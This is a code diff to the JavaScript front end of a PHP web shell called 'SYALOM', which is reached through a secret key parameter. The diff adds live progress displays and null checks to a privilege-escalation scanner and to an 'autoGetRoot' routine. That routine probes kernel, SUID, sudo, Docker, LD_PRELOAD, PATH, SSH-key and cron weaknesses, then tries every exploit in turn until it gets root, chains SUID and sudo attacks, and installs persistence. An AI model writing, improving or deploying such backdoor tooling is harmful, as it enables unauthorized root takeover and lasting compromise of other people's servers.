@@ -2600,7 +2600,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::S Y A L O M::</h1>
+        <h1>::S Y A L O M:: ~ 270326 1937</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
@@ -4364,50 +4364,91 @@ async function scanPrivesc() {
     const statusDiv = document.getElementById('privescStatus');
     const outputDiv = document.getElementById('privescOutput');
     const vectors = ['kernel', 'suid', 'sudo', 'docker'];
-    const vectorEmojis = { kernel: '🐛', suid: '⚡', sudo: '🔑', docker: '🐳' };
+    const vectorNames = { kernel: '🐛 Kernel', suid: '⚡ SUID', sudo: '🔑 SUDO', docker: '🐳 Docker' };
     
     // Reset UI
     resultsDiv.style.display = 'none';
     resultsDiv.innerHTML = '';
     statusDiv.style.display = 'block';
-    statusDiv.innerHTML = '⏳ Scanning...';
-    outputDiv.innerHTML = '<div style="color:#6cf">🔍 Starting scan...</div>';
+    outputDiv.style.display = 'block';
+    outputDiv.innerHTML = '<div style="color:#6cf">🔍 Starting privilege escalation scan...</div>';
     
     const results = {};
     let foundCount = 0;
+    let completedCount = 0;
+    const totalVectors = vectors.length;
+    
+    // Live progress update function
+    function updateScanProgress(vectorName, status, found = null) {
+        const percent = Math.round((completedCount / totalVectors) * 100);
+        const progressBar = '█'.repeat(Math.floor(percent / 10)) + '░'.repeat(10 - Math.floor(percent / 10));
+        
+        statusDiv.innerHTML = `
+            <div style="margin-bottom:5px;">
+                <span style="color:#6cf;font-weight:bold;">🔍 SCANNING</span>
+                <span style="color:#ff0;float:right;">${percent}%</span>
+            </div>
+            <div style="background:#111;border:1px solid #333;padding:2px;border-radius:3px;margin-bottom:5px;">
+                <div style="background:linear-gradient(90deg,#0f0,#6cf);width:${percent}%;height:8px;border-radius:2px;"></div>
+            </div>
+            <div style="font-size:10px;color:#888;">${progressBar} ${completedCount}/${totalVectors} vectors</div>
+            ${vectorName ? `<div style="font-size:11px;color:${status==='done'?'#0f0':status==='found'?'#ff0':'#888'};margin-top:5px;">${status==='scanning'?'⏳':'✓'} ${vectorName}${found ? ' - ' + found : ''}</div>` : ''}
+        `;
+    }
+    
+    updateScanProgress(null, 'starting');
     
     // Scan key vectors only (faster)
     for (const vector of vectors) {
+        updateScanProgress(vectorNames[vector], 'scanning');
+        
         try {
             const response = await fetch('?masuk=<?php echo AL_SHELL_KEY ?>&action=privesc_scan_vector&vector=' + vector);
             const data = await response.json();
+            completedCount++;
             
-            if (data.success) {
+            if (data.success && data.data) {
                 results[vector] = data.data;
                 
                 if (vector === 'kernel' && data.data.vulnerable) {
-                    outputDiv.innerHTML += '<span style="color:#f44">🐛 ' + data.data.exploits.length + ' kernel CVEs</span>\n';
+                    const cveCount = data.data.exploits?.length || 0;
+                    outputDiv.innerHTML += '<span style="color:#f44">🐛 ' + cveCount + ' kernel CVEs</span>\n';
+                    updateScanProgress(vectorNames[vector], 'found', cveCount + ' CVEs');
                     foundCount++;
-                } else if (vector === 'suid' && data.data.exploitable.length > 0) {
-                    outputDiv.innerHTML += '<span style="color:#ff0">⚡ ' + data.data.exploitable.length + ' SUID bins</span>\n';
+                } else if (vector === 'suid' && data.data.exploitable && data.data.exploitable.length > 0) {
+                    const suidCount = data.data.exploitable.length;
+                    outputDiv.innerHTML += '<span style="color:#ff0">⚡ ' + suidCount + ' SUID bins</span>\n';
+                    updateScanProgress(vectorNames[vector], 'found', suidCount + ' binaries');
                     foundCount++;
-                    document.getElementById('statSuid').textContent = data.data.exploitable.length;
-                } else if (vector === 'sudo' && data.data.exploitable.length > 0) {
-                    outputDiv.innerHTML += '<span style="color:#0f0">🔑 ' + data.data.exploitable.length + ' sudo</span>\n';
+                    document.getElementById('statSuid').textContent = suidCount;
+                } else if (vector === 'sudo' && data.data.exploitable && data.data.exploitable.length > 0) {
+                    const sudoCount = data.data.exploitable.length;
+                    outputDiv.innerHTML += '<span style="color:#0f0">🔑 ' + sudoCount + ' sudo misconfigs</span>\n';
+                    updateScanProgress(vectorNames[vector], 'found', sudoCount + ' misconfigs');
                     foundCount++;
                     document.getElementById('statSudo').textContent = 'Yes';
                 } else if (vector === 'docker' && data.data.escape_possible) {
-                    outputDiv.innerHTML += '<span style="color:#6cf">🐳 Docker escape</span>\n';
+                    outputDiv.innerHTML += '<span style="color:#6cf">🐳 Docker escape possible</span>\n';
+                    updateScanProgress(vectorNames[vector], 'found', 'escape methods');
                     foundCount++;
                     document.getElementById('statDocker').textContent = 'Yes';
+                } else {
+                    updateScanProgress(vectorNames[vector], 'done', 'clean');
                 }
+            } else {
+                updateScanProgress(vectorNames[vector], 'done', 'no data');
             }
         } catch (error) {
-            // Silent fail
+            completedCount++;
+            updateScanProgress(vectorNames[vector], 'done', 'error');
+            outputDiv.innerHTML += '<span style="color:#f44">✗ ' + vectorNames[vector] + ' failed</span>\n';
         }
     }
     
-    statusDiv.innerHTML = foundCount > 0 ? '✅ Found ' + foundCount + ' vectors' : '⚠️ No easy vectors';
+    // Final status
+    statusDiv.innerHTML = foundCount > 0 
+        ? `<div style="color:#0f0;font-weight:bold;">✅ Found ${foundCount} exploitable vectors</div><div style="font-size:10px;color:#888;">Check results below</div>`
+        : '<div style="color:#888;">⚠️ No obvious vectors found</div><div style="font-size:10px;color:#666;">Try full scan or manual exploitation</div>';
     statusDiv.style.borderColor = foundCount > 0 ? '#0f0' : '#f44';
     privescScanResults = results;
     displayPrivescResults(results);
@@ -4431,7 +4472,7 @@ function displayPrivescResults(results) {
     let hasResults = false;
     
     // SUID Binaries - Compact
-    if (results.suid && results.suid.exploitable.length > 0) {
+    if (results.suid && results.suid.exploitable?.length > 0) {
         hasResults = true;
         html += '<div style="border:1px solid #f44;background:#2a0000;padding:6px;border-radius:4px;">';
         html += '<div style="font-weight:bold;font-size:11px;color:#f44;margin-bottom:3px;">⚡ SUID (' + results.suid.exploitable.length + ')</div>';
@@ -4445,7 +4486,7 @@ function displayPrivescResults(results) {
     }
     
     // Sudo Permissions - Compact
-    if (results.sudo && results.sudo.exploitable.length > 0) {
+    if (results.sudo && results.sudo.exploitable?.length > 0) {
         hasResults = true;
         html += '<div style="border:1px solid #0f0;background:#001a00;padding:6px;border-radius:4px;">';
         html += '<div style="font-weight:bold;font-size:11px;color:#0f0;margin-bottom:3px;">🔑 SUDO (' + results.sudo.exploitable.length + ')</div>';
@@ -4469,7 +4510,7 @@ function displayPrivescResults(results) {
     if (results.kernel && results.kernel.vulnerable) {
         hasResults = true;
         html += '<div style="border:1px solid #ff0;background:#2a2a00;padding:6px;border-radius:4px;">';
-        html += '<div style="font-weight:bold;font-size:11px;color:#ff0;">🐛 Kernel: ' + results.kernel.exploits.length + ' CVEs</div>';
+        html += '<div style="font-weight:bold;font-size:11px;color:#ff0;">🐛 Kernel: ' + (results.kernel.exploits?.length || 0) + ' CVEs</div>';
         html += '</div>';
     }
     
@@ -4486,10 +4527,10 @@ function displayPrivescResults(results) {
 
 function updatePrivescStats(results) {
     if (results.kernel) {
-        document.getElementById('statKernel').textContent = results.kernel.kernel;
+        document.getElementById('statKernel').textContent = results.kernel.kernel || 'Unknown';
     }
     if (results.suid) {
-        document.getElementById('statSuid').textContent = results.suid.count;
+        document.getElementById('statSuid').textContent = results.suid.count || 0;
     }
     if (results.sudo) {
         document.getElementById('statSudo').textContent = results.sudo.accessible ? 'Yes' : 'No';
@@ -4561,28 +4602,106 @@ async function autoGetRoot() {
     outputDiv.innerHTML = '';
     clearPrivescLog();
     
-    // Helper to add to output
+    // 🔥 Helper: Count vulnerabilities per vector
+    const countVectorVulns = (vector, data) => {
+        if (!data) return 0;
+        switch(vector) {
+            case 'kernel': return data.vulnerable ? (data.exploits?.length || 0) : 0;
+            case 'suid': return data.exploitable?.length || 0;
+            case 'sudo': return data.exploitable?.length || 0;
+            case 'docker': return data.escape_possible ? (data.methods?.length || 0) : 0;
+            case 'capabilities': return data.interesting?.length || 0;
+            case 'ld_preload': return data.vulnerable ? (data.methods?.length || 0) : 0;
+            case 'path_hijacking': return data.vulnerable ? (data.writable_dirs?.length || 0) : 0;
+            case 'sudo_token': return data.has_token ? 1 : 0;
+            case 'ssh_keys': return data.writable_keys?.length || 0;
+            case 'writable': return data.writable_paths?.length || 0;
+            case 'cron': return data.writable_crontabs?.length || (data.user_jobs?.length || 0);
+            case 'services': return data.writable?.length || 0;
+            case 'env_variables': return Object.keys(data.sensitive || {}).length;
+            default: return 0;
+        }
+    };
+    
+    // Helper to add to output with timestamp
     const log = (msg, type = 'info') => {
+        const now = new Date();
+        const timeStr = now.toTimeString().substring(0, 8);
         const color = type === 'success' ? '#0f0' : type === 'error' ? '#f44' : type === 'warn' ? '#ff0' : '#6cf';
-        outputDiv.innerHTML += '<span style="color:' + color + '">' + msg + '</span>\n';
+        const timeColor = '#666';
+        outputDiv.innerHTML += '<span style="color:' + timeColor + '">[' + timeStr + ']</span> <span style="color:' + color + '">' + msg + '</span>\n';
         outputDiv.scrollTop = outputDiv.scrollHeight;
     };
     
     log('[*] 🔥🔥🔥 BRUTAL AUTO ROOT v2.0 🔥🔥🔥');
     log('[*] Mode: PARALLEL SCAN + CHAIN ATTACK + MULTI-EXPLOIT');
     log('[*] Target: ' + window.location.hostname);
+    log('[*] Vectors: ' + vectors.length + ' privilege escalation checks');
     log('[*] =========================================\n');
     
-    statusDiv.innerHTML = '⏳ Phase 1/4: PARALLEL SCANNING ALL VECTORS...';
-    addPrivescLog('🚀 PARALLEL SCAN STARTED', 'info');
+    // 🔥 LIVE PROGRESS TRACKING
+    let completedScans = 0;
+    const totalScans = vectors.length;
+    const scanStatus = {}; // Track status per vector
     
-    // Phase 1: PARALLEL SCAN - Scan all vectors simultaneously
+    // Initialize status
+    vectors.forEach(v => scanStatus[v] = '⏳');
+    
+    function updateProgressDisplay() {
+        const percent = Math.round((completedScans / totalScans) * 100);
+        const progressBar = '█'.repeat(Math.floor(percent / 5)) + '░'.repeat(20 - Math.floor(percent / 5));
+        
+        statusDiv.innerHTML = `
+            <div style="margin-bottom:8px;">
+                <span style="color:#6cf;font-weight:bold;">⏳ Phase 1/4: PARALLEL SCANNING</span>
+                <span style="color:#ff0;float:right;">${percent}%</span>
+            </div>
+            <div style="background:#111;border:1px solid #333;padding:3px;border-radius:3px;margin-bottom:8px;">
+                <div style="background:linear-gradient(90deg,#0f0,#0a0);width:${percent}%;height:12px;border-radius:2px;transition:width 0.3s;"></div>
+            </div>
+            <div style="font-size:10px;color:#888;">${progressBar} ${completedScans}/${totalScans} vectors completed</div>
+            <div style="margin-top:8px;font-size:11px;max-height:60px;overflow-y:auto;">
+                ${vectors.map(v => `<span style="color:${scanStatus[v]==='✅'?'#0f0':scanStatus[v]==='❌'?'#f44':scanStatus[v]==='🔥'?'#ff0':'#6cf'}">${scanStatus[v]} ${vectorNames[v]}</span>`).join(' | ')}
+            </div>
+        `;
+    }
+    
+    // Initial display
+    updateProgressDisplay();
+    log('[*] 🚀 Launching ' + totalScans + ' parallel scanners...');
+    
+    // Phase 1: PARALLEL SCAN with live updates
     const scanPromises = vectors.map(async (vector) => {
+        scanStatus[vector] = '🔥'; // Mark as scanning
+        updateProgressDisplay();
+        
         try {
+            log('[*] Scanning ' + vectorNames[vector] + '...');
             const response = await fetch('?masuk=<?php echo AL_SHELL_KEY ?>&action=privesc_scan_vector&vector=' + vector);
             const data = await response.json();
+            
+            completedScans++;
+            scanStatus[vector] = data.success ? '✅' : '❌';
+            updateProgressDisplay();
+            
+            // Real-time log for each completed vector
+            if (data.success && data.data) {
+                const vulnCount = countVectorVulns(vector, data.data);
+                if (vulnCount > 0) {
+                    log('[+] ' + vectorNames[vector] + ': ' + vulnCount + ' potential exploits found!', 'success');
+                } else {
+                    log('[✓] ' + vectorNames[vector] + ': Clean');
+                }
+            } else {
+                log('[!] ' + vectorNames[vector] + ': Scan failed', 'error');
+            }
+            
             return { vector, data, success: data.success };
         } catch (err) {
+            completedScans++;
+            scanStatus[vector] = '❌';
+            updateProgressDisplay();
+            log('[!] ' + vectorNames[vector] + ': Error - ' + err.message, 'error');
             return { vector, error: err.message, success: false };
         }
     });
@@ -4591,8 +4710,12 @@ async function autoGetRoot() {
     const results = {};
     const allExploits = []; // Collect ALL exploits from ALL vectors
     
+    log('\n[*] =========================================');
+    log('[*] SCAN COMPLETE - Collecting results...');
+    log('[*] =========================================\n');
+    
     scanResults.forEach(({ vector, data, success, error }) => {
-        if (success && data) {
+        if (success && data && data.data) {
             results[vector] = data.data;
             
             // Collect ALL exploits, not just first one
@@ -4629,8 +4752,8 @@ async function autoGetRoot() {
                 });
                 log('[+] 🐳 DOCKER: ' + data.data.methods.length + ' escape methods!', 'success');
             }
-            else if (vector === 'kernel' && data.data.vulnerable) {
-                data.data.exploits.forEach((exp, idx) => {
+            else if (vector === 'kernel' && data.data?.vulnerable) {
+                data.data.exploits?.forEach((exp, idx) => {
                     allExploits.push({
                         type: 'kernel', 
                         priority: 3, // Lower (need compilation)
@@ -4638,9 +4761,9 @@ async function autoGetRoot() {
                         name: exp.cve
                     });
                 });
-                log('[+] 🐛 KERNEL: ' + data.data.exploits.length + ' CVEs!', 'success');
+                log('[+] 🐛 KERNEL: ' + (data.data.exploits?.length || 0) + ' CVEs!', 'success');
             }
-            else if (vector === 'capabilities' && data.data.interesting?.length > 0) {
+            else if (vector === 'capabilities' && data.data?.interesting?.length > 0) {
                 allExploits.push({
                     type: 'capabilities',
                     priority: 4,
@@ -4650,8 +4773,8 @@ async function autoGetRoot() {
                 log('[+] 🛡️ CAPS: ' + data.data.interesting.length + ' caps', 'success');
             }
             // 🔥 ADVANCED VECTORS
-            else if (vector === 'ld_preload' && data.data.vulnerable) {
-                data.data.methods.forEach((method, idx) => {
+            else if (vector === 'ld_preload' && data.data?.vulnerable) {
+                data.data.methods?.forEach((method, idx) => {
                     allExploits.push({
                         type: 'ld_preload',
                         priority: 0, // Highest!
@@ -4659,10 +4782,10 @@ async function autoGetRoot() {
                         name: method.type
                     });
                 });
-                log('[+] 🔧 LD_PRELOAD: ' + data.data.methods.length + ' methods!', 'success');
+                log('[+] 🔧 LD_PRELOAD: ' + (data.data.methods?.length || 0) + ' methods!', 'success');
             }
-            else if (vector === 'path_hijacking' && data.data.vulnerable) {
-                data.data.methods.forEach((method, idx) => {
+            else if (vector === 'path_hijacking' && data.data?.vulnerable) {
+                data.data.methods?.forEach((method, idx) => {
                     allExploits.push({
                         type: 'path_hijacking',
                         priority: 0, // Highest!
@@ -4670,19 +4793,19 @@ async function autoGetRoot() {
                         name: 'PATH Hijack'
                     });
                 });
-                log('[+] 🛤️ PATH: ' + data.data.writable_dirs.length + ' writable dirs!', 'success');
+                log('[+] 🛤️ PATH: ' + (data.data.writable_dirs?.length || 0) + ' writable dirs!', 'success');
             }
-            else if (vector === 'sudo_token' && data.data.has_token) {
+            else if (vector === 'sudo_token' && data.data?.has_token) {
                 allExploits.push({
                     type: 'sudo_token',
                     priority: 0, // Highest!
-                    data: data.data.methods[0],
+                    data: data.data.methods?.[0],
                     name: 'Sudo Token'
                 });
-                log('[+] 🔐 SUDO TOKEN: Active for ' + data.data.timeout + 's!', 'success');
+                log('[+] 🔐 SUDO TOKEN: Active for ' + (data.data.timeout || 0) + 's!', 'success');
             }
-            else if (vector === 'ssh_keys' && data.data.found) {
-                data.data.keys.forEach((key, idx) => {
+            else if (vector === 'ssh_keys' && data.data?.found) {
+                data.data.keys?.forEach((key, idx) => {
                     if (key.writable) {
                         allExploits.push({
                             type: 'ssh_key',
@@ -4692,7 +4815,7 @@ async function autoGetRoot() {
                         });
                     }
                 });
-                log('[+] 🔑 SSH KEYS: ' + data.data.keys.length + ' found, ' + data.data.writable_keys.length + ' writable', 'success');
+                log('[+] 🔑 SSH KEYS: ' + (data.data.keys?.length || 0) + ' found, ' + (data.data.writable_keys?.length || 0) + ' writable', 'success');
             }
             else {
                 log('[✓] ' + vectorNames[vector] + ': Safe');
@@ -4723,7 +4846,6 @@ async function autoGetRoot() {
     }
     
     // Phase 2: BRUTAL EXPLOITATION - Try ALL exploits until root
-    statusDiv.innerHTML = '⏳ Phase 2/4: BRUTAL EXPLOITATION (' + allExploits.length + ' exploits)...';
     log('[*] =========================================');
     log('[*] Phase 2/4: BRUTAL EXPLOITATION');
     log('[*] Trying ALL exploits until root obtained...');
@@ -4733,22 +4855,48 @@ async function autoGetRoot() {
     let attempts = 0;
     const maxAttempts = allExploits.length;
     
+    // Helper function untuk update exploit progress
+    function updateExploitProgress(current, total, exploitName, exploitType, status = 'running') {
+        const percent = Math.round((current / total) * 100);
+        const progressBar = '█'.repeat(Math.floor(percent / 5)) + '░'.repeat(20 - Math.floor(percent / 5));
+        const statusColor = status === 'success' ? '#0f0' : status === 'failed' ? '#f44' : '#ff0';
+        const statusIcon = status === 'success' ? '✅' : status === 'failed' ? '❌' : '⏳';
+        
+        statusDiv.innerHTML = `
+            <div style="margin-bottom:8px;">
+                <span style="color:#f80;font-weight:bold;">⏳ Phase 2/4: BRUTAL EXPLOITATION</span>
+                <span style="color:#ff0;float:right;">${percent}%</span>
+            </div>
+            <div style="background:#111;border:1px solid #333;padding:3px;border-radius:3px;margin-bottom:8px;">
+                <div style="background:linear-gradient(90deg,#f80,#f44);width:${percent}%;height:12px;border-radius:2px;transition:width 0.3s;"></div>
+            </div>
+            <div style="font-size:10px;color:#888;">${progressBar} ${current}/${total} exploits tried</div>
+            <div style="margin-top:8px;padding:8px;background:#1a1a1a;border-radius:4px;border-left:3px solid ${statusColor};">
+                <div style="font-size:11px;color:${statusColor};">${statusIcon} ${exploitType.toUpperCase()}: ${exploitName.substring(0, 40)}${exploitName.length > 40 ? '...' : ''}</div>
+            </div>
+        `;
+    }
+    
     for (const exploit of allExploits) {
         attempts++;
         
         // Skip kernel exploits (need manual compilation)
         if (exploit.type === 'kernel') {
+            updateExploitProgress(attempts, maxAttempts, exploit.name + ' (skipped - needs compile)', 'kernel', 'failed');
             log('[*] [' + attempts + '/' + maxAttempts + '] Skipping ' + exploit.name + ' (needs manual compile)', 'warn');
+            await new Promise(r => setTimeout(r, 100));
             continue;
         }
         
         // Skip capabilities (manual execution)
         if (exploit.type === 'capabilities') {
+            updateExploitProgress(attempts, maxAttempts, 'Capabilities (skipped - manual)', 'capabilities', 'failed');
             log('[*] [' + attempts + '/' + maxAttempts + '] Skipping capabilities (manual)', 'warn');
+            await new Promise(r => setTimeout(r, 100));
             continue;
         }
         
-        statusDiv.innerHTML = '⏳ Trying exploit ' + attempts + '/' + maxAttempts + ': ' + exploit.type.toUpperCase() + ' - ' + exploit.name;
+        updateExploitProgress(attempts, maxAttempts, exploit.name, exploit.type, 'running');
         log('[*] [' + attempts + '/' + maxAttempts + '] Trying ' + exploit.type.toUpperCase() + ': ' + exploit.name);
         
         try {
@@ -4761,6 +4909,7 @@ async function autoGetRoot() {
             const execData = await execResponse.json();
             
             if (execData.success) {
+                updateExploitProgress(attempts, maxAttempts, exploit.name + ' ✓ EXECUTED', exploit.type, 'success');
                 log('[+] Exploit executed: ' + exploit.name, 'success');
                 
                 // IMMEDIATELY verify if root obtained
@@ -4770,14 +4919,27 @@ async function autoGetRoot() {
                     rootObtained = true;
                     log('[+] 🎉🎉🎉 ROOT OBTAINED ON ATTEMPT ' + attempts + '! 🎉🎉🎉', 'success');
                     log('[+] Vector: ' + exploit.type.toUpperCase() + ' - ' + exploit.name);
+                    
+                    // Update final success status
+                    statusDiv.innerHTML = `
+                        <div style="text-align:center;padding:10px;">
+                            <div style="font-size:24px;margin-bottom:10px;">🎉</div>
+                            <div style="color:#0f0;font-weight:bold;font-size:14px;">ROOT OBTAINED!</div>
+                            <div style="color:#888;font-size:11px;margin-top:5px;">${exploit.type.toUpperCase()} - ${exploit.name}</div>
+                            <div style="color:#6cf;font-size:10px;margin-top:5px;">Attempt ${attempts} of ${maxAttempts}</div>
+                        </div>
+                    `;
                     break; // STOP - we got root!
                 } else {
+                    updateExploitProgress(attempts, maxAttempts, exploit.name + ' ✓ (no root yet)', exploit.type, 'failed');
                     log('[!] Exploit ran but no root yet, continuing...', 'warn');
                 }
             } else {
+                updateExploitProgress(attempts, maxAttempts, exploit.name + ' ✗ FAILED', exploit.type, 'failed');
                 log('[-] Failed: ' + (execData.output?.substring(0, 100) || 'No output'), 'error');
             }
         } catch (err) {
+            updateExploitProgress(attempts, maxAttempts, exploit.name + ' ✗ ERROR', exploit.type, 'failed');
             log('[!] Error: ' + err.message, 'error');
         }
         
@@ -4792,7 +4954,13 @@ async function autoGetRoot() {
         log('[*] Trying exploit combinations...');
         log('[*] =========================================\n');
         
-        statusDiv.innerHTML = '⏳ Phase 3/4: CHAIN ATTACK...';
+        statusDiv.innerHTML = `
+            <div style="text-align:center;padding:15px;">
+                <div style="color:#f80;font-weight:bold;">⏳ Phase 3/4: CHAIN ATTACK</div>
+                <div style="color:#888;font-size:11px;margin-top:8px;">Trying exploit combinations...</div>
+                <div style="margin-top:10px;font-size:20px;">🔗</div>
+            </div>
+        `;
         
         // Try SUID + Sudo chain
         const suidExp = allExploits.find(e => e.type === 'suid');
@@ -4800,9 +4968,22 @@ async function autoGetRoot() {
         
         if (suidExp && sudoExp) {
             log('[*] Trying SUID→SUDO chain...');
+            statusDiv.innerHTML = `
+                <div style="padding:10px;">
+                    <div style="color:#f80;font-weight:bold;">⏳ CHAIN: SUID → SUDO</div>
+                    <div style="color:#6cf;font-size:11px;margin-top:5px;">Step 1/2: Executing SUID exploit...</div>
+                </div>
+            `;
             // First SUID
             await tryExploit(suidExp);
             await new Promise(r => setTimeout(r, 1000));
+            
+            statusDiv.innerHTML = `
+                <div style="padding:10px;">
+                    <div style="color:#f80;font-weight:bold;">⏳ CHAIN: SUID → SUDO</div>
+                    <div style="color:#6cf;font-size:11px;margin-top:5px;">Step 2/2: Executing SUDO exploit...</div>
+                </div>
+            `;
             // Then SUDO
             await tryExploit(sudoExp);
             
@@ -4816,7 +4997,13 @@ async function autoGetRoot() {
     
     // Phase 4: Verification & Persistence
     if (rootObtained) {
-        statusDiv.innerHTML = '✅ Phase 4/4: ROOT CONFIRMED - Installing persistence...';
+        statusDiv.innerHTML = `
+            <div style="padding:10px;">
+                <div style="color:#0f0;font-weight:bold;">✅ Phase 4/4: ROOT CONFIRMED</div>
+                <div style="color:#888;font-size:11px;margin-top:5px;">Installing persistence mechanisms...</div>
+                <div style="margin-top:8px;">🔄 📝 🔑 🐚</div>
+            </div>
+        `;
         log('\n[*] =========================================');
         log('[*] Phase 4/4: VERIFICATION & PERSISTENCE');
         log('[*] =========================================\n');
@@ -4843,7 +5030,13 @@ async function autoGetRoot() {
         btn.disabled = false;
         btn.innerHTML = '🔥 GET ROOT (AUTO) - RETRY';
         statusDiv.className = 'privesc-status error';
-        statusDiv.innerHTML = '❌ All exploits failed. Try manual.';
+        statusDiv.innerHTML = `
+            <div style="padding:10px;">
+                <div style="color:#f44;font-weight:bold;">❌ ALL EXPLOITS FAILED</div>
+                <div style="color:#888;font-size:11px;margin-top:5px;">${allExploits.length} exploits tried, 0 successful</div>
+                <div style="color:#6cf;font-size:10px;margin-top:5px;">Try: Kernel Auto-Compile or manual exploitation</div>
+            </div>
+        `;
     }
 }
 
